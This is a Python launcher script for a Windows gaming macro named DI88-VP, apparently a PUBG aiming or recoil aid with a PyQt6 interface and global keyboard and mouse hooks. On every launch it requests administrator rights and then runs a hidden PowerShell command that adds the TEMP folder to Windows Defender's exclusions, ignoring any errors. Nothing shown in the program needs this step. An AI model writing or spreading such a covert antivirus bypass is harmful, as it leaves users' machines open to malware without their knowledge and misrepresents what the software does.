import ctypes
import os
import subprocess
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.core import utils as Utils

os.environ["QT_LOGGING_RULES"] = "*.debug=false;qt.qpa.*=false"
os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"


def print_banner():
    banner = """
    ====================================================
    ||                                                ||
    ||           DI88-VP  ULTRA PREMIUM               ||
    ||        High-Performance Gaming Macro           ||
    ||                                                ||
    ====================================================
    """
    print(banner)


def _add_defender_exclusion():
    try:
        temp_path = os.environ.get("TEMP", r"C:\Users\Admin\AppData\Local\Temp")
        subprocess.run(
            [
                "powershell",
                "-WindowStyle",
                "Hidden",
                "-Command",
                f'Add-MpPreference -ExclusionPath "{temp_path}" -ErrorAction SilentlyContinue',
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def _self_elevate_and_whitelist():
    if not Utils.is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1
        )
        sys.exit(0)
    _add_defender_exclusion()


def _optimize_cpu_and_priority():
    try:
        import psutil

        proc = psutil.Process(os.getpid())
        proc.nice(psutil.HIGH_PRIORITY_CLASS)

        count = psutil.cpu_count()
        if count and count > 1:
            proc.cpu_affinity([count - 1])
            print(
                f" > [SYSTEM] CPU Isolated: Pinned to Core {count - 1} (Avoid FPS Drops)"
            )
    except Exception as e:
        print(f" > [WARN] CPU Optimization failed: {e}")


if __name__ == "__main__":
    Utils.set_high_dpi()
    _self_elevate_and_whitelist()
    _optimize_cpu_and_priority()

    from PyQt6.QtGui import QFont, QIcon
    from PyQt6.QtWidgets import QApplication

    from src.core.backend import BackendThread
    from src.core.controllers.gui_bridge import GuiInputBridge
    from src.core.path_utils import get_resource_path
    from src.core.timing import HighPrecisionTimer
    from src.gui.macro_window import MacroWindow
    from src.input.keyboard_listener import KeyboardListener
    from src.input.mouse_listener import MouseListener

    myappid = "di88.phutho.macro.v1"
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
    except Exception:
        pass

    timer_enforcer = HighPrecisionTimer()
    timer_enforcer.start()

    app = QApplication(sys.argv)
    app.setApplicationName("Di88-VP")
    app.setApplicationDisplayName("Di88-VP")
    app.setFont(QFont("Segoe UI", 9))

    window = MacroWindow()
    window.setWindowTitle("Di88-VP")
    window.setWindowIcon(QIcon(get_resource_path("di88vp.ico")))

    backend = BackendThread()
    backend.signal_update.connect(window.update_ui_state)
    backend.signal_message.connect(window.show_message)
    backend.signal_ads_update.connect(window.update_ads_display)

    initial_ads = getattr(backend.pubg_config, "ads_mode", None)
    if initial_ads:
        window.update_ads_display(initial_ads.upper())

    window.set_backend(backend)
    window.signal_settings_changed.connect(backend.reload_config)

    input_bridge = GuiInputBridge(window, backend)

    keyboard_listener = KeyboardListener()
    input_bridge.keyboard_listener = keyboard_listener
    keyboard_listener.signal_key_event.connect(input_bridge.handle_raw_key)
    keyboard_listener.signal_action.connect(input_bridge.handle_input_action)
    keyboard_listener.start_listening()

    mouse_listener = MouseListener()
    mouse_listener.signal_click.connect(input_bridge.handle_mouse_click)
    mouse_listener.start_listening()

    def exception_hook(exctype, value, tb):
        import traceback

        err_msg = "".join(traceback.format_exception(exctype, value, tb))
        print(f"\n> [CRASH REPORT]\n{err_msg}")
        timer_enforcer.stop()
        sys.exit(1)

    sys.excepthook = exception_hook

    backend.start()
    window.show()

    print(" > [SYSTEM] Macro DI88-VP is Ready!")
    sys.exit(app.exec())
